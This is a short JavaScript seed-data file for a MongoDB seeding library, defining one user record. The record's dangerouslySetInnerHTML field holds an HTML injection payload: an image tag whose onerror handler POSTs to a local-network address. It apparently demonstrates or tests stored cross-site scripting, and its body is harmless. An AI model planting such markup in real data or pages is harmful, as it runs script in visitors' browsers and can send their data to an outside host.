const { getObjectId } = require("mongo-seeding");

const data = [
  {
    name: "Victor",
    age: 30,
    isMale: true,
    style: {
      color: "#000",
      backgroundColor: "#ccc",
    },
    dangerouslySetInnerHTML: {
      __html:
        "<img onerror='fetch(`http://192.168.0.105:8080/health-check`, {method: `POST`, body: JSON.stringify({hello: `world`})})' src='invalid-image' />",
    },
  },
];

module.exports = data.map((obj) => ({
  ...obj,
  _id: getObjectId(obj.name),
}));
